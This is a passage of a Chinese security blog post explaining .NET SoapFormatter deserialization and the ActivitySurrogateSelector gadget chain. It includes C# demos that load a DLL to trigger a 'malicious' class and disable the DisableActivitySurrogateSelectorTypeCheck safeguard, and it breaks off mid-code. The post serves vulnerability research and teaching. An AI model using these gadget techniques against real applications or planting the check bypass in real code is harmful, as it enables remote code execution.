<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>【.NET 安全】ASP.NET SoapFormatter Deserialization 04 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="【.NET 安全】ASP.NET SoapFormatter Deserialization 04 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2024/02/26/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20SoapFormatter%20Deserialization%2004/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-02-26T12:29:42.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>February</span>
            <span>26,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">【.NET 安全】ASP.NET SoapFormatter Deserialization 04</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="0-0-参考"><a href="#0-0-参考" class="headerlink" title="0-0 参考"></a>0-0 参考</h1><p><a target="_blank" rel="noopener" href="https://github.com/Y4er/dotnet-deserialization/blob/main/SoapFormatter.md">https://github.com/Y4er/dotnet-deserialization/blob/main/SoapFormatter.md</a></p>
<h1 id="0-1-ASP-NET-任意类加载"><a href="#0-1-ASP-NET-任意类加载" class="headerlink" title="0-1 ASP.NET 任意类加载"></a>0-1 ASP.NET 任意类加载</h1><p>作为和Java高度相似的一门语言，涉及到类，那就肯定涉及到类加载的问题，而DOTNET里的类加载其实也是一样的。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DonNET_Deserialization</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TEST</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> assembly = Assembly.Load(File.ReadAllBytes(<span class="string">&quot;ExpClassa.dll&quot;</span>));</span><br><span class="line">        <span class="keyword">var</span> types = assembly.GetTypes();</span><br><span class="line">        Activator.CreateInstance(types[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>csharp里类编译后会变成dll文件，那么我们同样的也可以读取dll文件的字节流，通过Assembly.Load方法去加载，获取到的是一个assembly对象，通过gettypes获取dll内所有的类型，这里当然只有一个类型，然后通过<code>Activator.CreateInstance</code>实例化对象触发恶意方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708750017477-aa332d5a-0947-4a4c-a8f3-cf0775bad88a.png#averageHue=%23323030&clientId=uf24e7de4-7362-4&from=paste&height=414&id=u0b0b51c6&originHeight=518&originWidth=1220&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=86920&status=done&style=none&taskId=uca8e800d-9348-45eb-8d36-eb1605fee71&title=&width=976" alt="image.png"><br>至此我们可以知道，Csharp里的链子形式其实都是类似的。</p>
<h1 id="0-2-SoapFormatter"><a href="#0-2-SoapFormatter" class="headerlink" title="0-2 SoapFormatter"></a>0-2 SoapFormatter</h1><p>这东西其实不是今天的重点，因为他只是个序列化的模式，这一节讲的其实是其他几个链子。这里简单介绍一下他的模式。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SoapDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> age;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span> =&gt; age; <span class="keyword">set</span> =&gt; age = <span class="keyword">value</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span> =&gt; name; <span class="keyword">set</span> =&gt; name = <span class="keyword">value</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SayHello</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;hello from SayHello&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            SoapFormatter soapFormatter = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.Age = <span class="number">10</span>;</span><br><span class="line">            person.Name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream stream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                soapFormatter.Serialize(stream,person);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">string</span> soap = Encoding.UTF8.GetString(stream.ToArray());</span><br><span class="line">                Console.WriteLine(soap);</span><br><span class="line"></span><br><span class="line">                stream.Position = <span class="number">0</span>;</span><br><span class="line">                Person p = (Person)soapFormatter.Deserialize(stream);</span><br><span class="line">                Console.WriteLine(p.Name);</span><br><span class="line">                p.SayHello();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>它和BinaryFormatter其实一样，可以选择代理器，所以思路也几乎一样。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENV:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:SOAP-ENC</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="attr">xm</span></span></span><br><span class="line"><span class="tag"><span class="attr">lns:SOAP-ENV</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:clr</span>=<span class="string">&quot;http://schemas.microsoft.com/soap/encoding/clr/1.0&quot;</span> <span class="attr">SOAP-ENV:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/enc</span></span></span><br><span class="line"><span class="string"><span class="tag">oding/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a1:Person</span> <span class="attr">id</span>=<span class="string">&quot;ref-1&quot;</span> <span class="attr">xmlns:a1</span>=<span class="string">&quot;http://schemas.microsoft.com/clr/nsassem/SoapDeserialization/DonNET%20Deserialization%2C%20Version%3D1.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyT</span></span></span><br><span class="line"><span class="string"><span class="tag">oken%3Dnull&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">age</span>&gt;</span>10<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span> <span class="attr">id</span>=<span class="string">&quot;ref-3&quot;</span>&gt;</span>jack<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a1:Person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SOAP-ENV:Envelope</span>&gt;</span></span><br><span class="line"></span><br><span class="line">jack</span><br><span class="line">hello from SayHello</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输出结果如上，输出的格式又和XmlSerializer一样。</p>
<h1 id="0-3-ActivitySurrogateSelector-攻击链"><a href="#0-3-ActivitySurrogateSelector-攻击链" class="headerlink" title="0-3 ActivitySurrogateSelector 攻击链"></a>0-3 ActivitySurrogateSelector 攻击链</h1><p>这一部分其实和Hessian反序列化很相似。在第一篇文章中，带大家了解了代理器的用法，代理器可以让一个不可序列化的类进行序列化，就和下面的Demo一样，但是你会意识到一个问题，就是他无法反序列化。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SoapDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Person</span>(<span class="params"><span class="built_in">string</span> name</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">ToString</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">PersonSerializeSurrogate</span> : <span class="title">ISerializationSurrogate</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">Object obj, SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> p = (Person)obj;</span><br><span class="line">            info.AddValue(<span class="string">&quot;Name&quot;</span>, p.Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">SetObjectData</span>(<span class="params">Object obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> p = (Person)obj;</span><br><span class="line">            p.Name = info.GetString(<span class="string">&quot;Name&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(<span class="string">&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            SoapFormatter fmt = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            MemoryStream stm = <span class="keyword">new</span> MemoryStream();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> ss = <span class="keyword">new</span> SurrogateSelector();</span><br><span class="line">            ss.AddSurrogate(<span class="keyword">typeof</span>(Person), <span class="keyword">new</span> StreamingContext(StreamingContextStates.All), <span class="keyword">new</span> PersonSerializeSurrogate());</span><br><span class="line">            fmt.SurrogateSelector = ss;</span><br><span class="line">            fmt.Serialize(stm, <span class="keyword">new</span> Person(<span class="string">&quot;jack&quot;</span>));</span><br><span class="line">            stm.Position = <span class="number">0</span>;</span><br><span class="line">            Console.WriteLine(fmt.Deserialize(stm));</span><br><span class="line"></span><br><span class="line">            stm.Position = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">var</span> fmt2 = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            Console.WriteLine(fmt2.Deserialize(stm));</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708913307609-24914cbb-ed52-4f1f-be3c-4642c4e8e2b0.png#averageHue=%239bb4ad&clientId=udc8a13d2-fd1b-4&from=paste&height=304&id=ufc274eec&originHeight=380&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78637&status=done&style=none&taskId=ue131bf34-6c3e-430c-baf9-a1130b2b781&title=&width=1536" alt="image.png"><br>但是今天说到的ActivitySurrogateSelector就不一样了，他可以序列化，也可以反序列化。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SoapDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">NonSerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> _text;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">NonSerializable</span>(<span class="params"><span class="built_in">string</span> text</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _text = text;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">ToString</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> _text;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Custom serialization surrogate</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title">MySurrogateSelector</span> : <span class="title">SurrogateSelector</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> ISerializationSurrogate <span class="title">GetSurrogate</span>(<span class="params">Type type, StreamingContext context, <span class="keyword">out</span> ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            selector = <span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">if</span> (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(<span class="string">&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">base</span>.GetSurrogate(type, context, <span class="keyword">out</span> selector);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(<span class="string">&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            SoapFormatter fmt = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            MemoryStream stm = <span class="keyword">new</span> MemoryStream();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            fmt.SurrogateSelector = <span class="keyword">new</span> MySurrogateSelector();</span><br><span class="line">            fmt.Serialize(stm, <span class="keyword">new</span> NonSerializable(<span class="string">&quot;Hello World!&quot;</span>));</span><br><span class="line">            stm.Position = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> fmt2 = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            Console.WriteLine(fmt2.Deserialize(stm));</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708913879879-fbaae556-88c9-426f-8052-d7b67656ea9d.png#averageHue=%234f4332&clientId=udc8a13d2-fd1b-4&from=paste&height=820&id=u60d4d7c4&originHeight=1025&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=235915&status=done&style=none&taskId=ubccdb42d-f1d2-49c5-8a78-af8e6324235&title=&width=1534.4" alt="image.png"><br>成功的反序列化了，这是为什么呢？我们可以去分析一下，可以看到payload中有<code>System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate</code>这一段，其中ObjectSurrogate是关键。<br>这是它的一个内部类</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">ObjectSurrogate</span> : <span class="title">ISerializationSurrogate</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (!AppSettings.DisableActivitySurrogateSelectorTypeCheck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">switch</span> (obj)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> ActivityBind _:</span><br><span class="line">            <span class="keyword">case</span> DependencyObject _:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="literal">default</span>:</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="keyword">nameof</span> (obj));</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        info.AddValue(<span class="string">&quot;type&quot;</span>, (<span class="built_in">object</span>) obj.GetType());</span><br><span class="line">        <span class="built_in">string</span>[] names = (<span class="built_in">string</span>[]) <span class="literal">null</span>;</span><br><span class="line">        MemberInfo[] serializableMembers = FormatterServicesNoSerializableCheck.GetSerializableMembers(obj.GetType(), <span class="keyword">out</span> names);</span><br><span class="line">        <span class="built_in">object</span>[] objectData = FormatterServices.GetObjectData(obj, serializableMembers);</span><br><span class="line">        info.AddValue(<span class="string">&quot;memberDatas&quot;</span>, (<span class="built_in">object</span>) objectData);</span><br><span class="line">        info.SetType(<span class="keyword">typeof</span> (ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">SetObjectData</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="built_in">object</span> obj,</span></span></span><br><span class="line"><span class="params"><span class="function">        SerializationInfo info,</span></span></span><br><span class="line"><span class="params"><span class="function">        StreamingContext context,</span></span></span><br><span class="line"><span class="params"><span class="function">        ISurrogateSelector selector</span>)</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">object</span>) <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>它做了一段处理<code>info.SetType(typeof (ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef));</code>它将我们序列化的类的属性设置为了ObjectSerializedRef，我们再看看这个类。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Serializable</span>]</span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span 